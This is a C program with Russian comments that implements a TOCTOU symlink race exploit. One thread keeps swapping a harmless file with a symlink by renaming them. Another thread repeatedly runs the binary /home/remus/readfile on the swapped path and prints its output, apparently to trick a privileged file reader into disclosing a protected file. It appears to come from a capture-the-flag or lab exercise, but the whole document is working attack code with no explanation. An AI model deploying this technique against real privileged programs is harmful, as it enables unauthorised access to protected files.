#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

#define BINARY_PATH "/home/remus/readfile"
#define SAFE_FILE "./file"
#define LINK_FILE "./link"

void *swap_files(void *arg) {
    char temp_file[] = "/tmp/temp";
    while (1) {
        // Меняем файлы местами с использованием временного файла
        if (rename(SAFE_FILE, temp_file) == -1) {
            perror("Rename safe to temp failed");
        }
        if (rename(LINK_FILE, SAFE_FILE) == -1) {
            perror("Rename link to safe failed");
        }
        if (rename(temp_file, LINK_FILE) == -1) {
            perror("Rename temp to link failed");
        }

    }
    return NULL;
}

void *run_binary(void *arg) {
    while (1) {
        int pipefd[2];
        if (pipe(pipefd) == -1) {
            perror("Pipe failed");
            exit(1);
        }

        pid_t pid = fork();
        if (pid == -1) {
            perror("Fork failed");
            exit(1);
        } else if (pid == 0) {
            // Дочерний процесс: перенаправляем stdout и stderr в pipe
            close(pipefd[0]); // Закрываем конец чтения
            dup2(pipefd[1], STDOUT_FILENO); // Перенаправляем stdout
            dup2(pipefd[1], STDERR_FILENO); // Перенаправляем stderr
            close(pipefd[1]); // Закрываем после дублирования

            // Запускаем бинарник с одним аргументом (SAFE_FILE)
            char *args[] = {BINARY_PATH, SAFE_FILE, NULL};
            execv(BINARY_PATH, args);
            perror("Exec failed");
            exit(1);
        }

        // Родительский процесс: читаем из pipe и выводим в терминал
        close(pipefd[1]); // Закрываем конец записи
        char buffer[1024];
        ssize_t nread;
        while ((nread = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
            buffer[nread] = '\0';
            printf("%s", buffer);
            fflush(stdout);
        }
        close(pipefd[0]);

        // Ждём завершения дочернего процесса
        waitpid(pid, NULL, 0);

    }
    return NULL;
}

int main() {
    pthread_t swap_thread, binary_thread;

    // Создаём поток для подмены файлов
    if (pthread_create(&swap_thread, NULL, swap_files, NULL) != 0) {
        perror("Failed to create swap thread");
        exit(1);
    }

    // Создаём поток для запуска бинарника
    if (pthread_create(&binary_thread, NULL, run_binary, NULL) != 0) {
        perror("Failed to create binary thread");
        exit(1);
    }

    // Ждём завершения потоков (они работают бесконечно)
    pthread_join(swap_thread, NULL);
    pthread_join(binary_thread, NULL);

    return 0;
}
